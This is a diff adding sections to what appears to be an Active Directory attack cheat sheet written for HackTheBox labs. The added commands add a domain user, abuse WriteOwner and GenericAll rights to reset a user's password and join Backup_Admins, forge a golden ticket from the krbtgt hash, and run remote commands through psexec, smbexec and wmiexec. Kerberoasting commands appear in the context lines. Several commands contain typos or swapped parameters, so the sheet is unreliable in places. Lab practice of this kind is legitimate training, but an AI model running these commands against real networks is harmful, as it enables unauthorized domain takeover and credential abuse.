@@ -102,7 +102,12 @@ nslookup dc01
 ```
 nslookup <server_name>
 ```
+### Add User to Domain and a Group
+```powershell
+PS> net user kullai kali@116 /add /domain
 
+PS> net group "Group name" /add kullai
+```
 #### Enumerate the SPN's and do kerberosting: [hashcat : -m 13100]
 ```
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
@@ -208,6 +213,65 @@ This saved the ticket on our Kali host as Administrator@cifs_resourcedc.resource
 ```
 
 you will get adminsitrator access !!
+
+## Write Owner Privilge:
+
+  We have access to `nico` user and we have WriteOwner Privilege to `Herman` user use command
+  
+  ```powershell
+  Powerview> Set-DomainObjectOwner -Identity 'target_object[nico]' -OwnerIdentity 'controlled_principal[Herman]'
+ ```
+ And we can also own and reset the `Herman` User password
+ 
+ ```powershell
+  Powerview> Add-DomainObjectAcl -TargetIdentity Herman -PrincipleIdentity nico -Rights ResetPassword
+ ```
+
+ Now re-run the bloodHound And Now you can see the `nico` user owns and he can change the password of `Herman`
+
+ Now try to change the `Herman` user password !!
+ 
+ ```powershell
+
+  $pass = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
+
+  SetDomainUserPassword Herman -AccountPassword $pass -Verbose
+```
+
+ Now the `Herman` is a user and he have `GenericAll` permissions on `BackUp Admins Group` Let's Add Herman to Backup Admins Group!!
+ 
+ ```
+ PS> Get-DomainGroup -MemberIdentity Herman | select samaccountname
+```
+We already have the password ($pass) so start with the other commands !!
+```powershell
+   PS> $cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
+   PS> Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
+   PS> Get-DomainGroup -MemberIdentity Herman | select samaccountname
+```
+   Now we `Herman` is part of `Backup_Admins`!!
+
+https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+
+## Golden Ticket !!
+
+We have kgbre hash !! [From Linux]
+
+`-domain-sid` --> 
+```powrshell
+Get-ADDomain htb.local
+```
+```powershell
+# python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain htb.local  <user_name [Anything or administrator]>
+
+# export KRB5CCNAME=<TGS_ccache_file>
+```
+```powershell
+# Execute remote commands with any of the following by using the TGT
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+```
 
 #### Search anywhere file in windows:
 ```
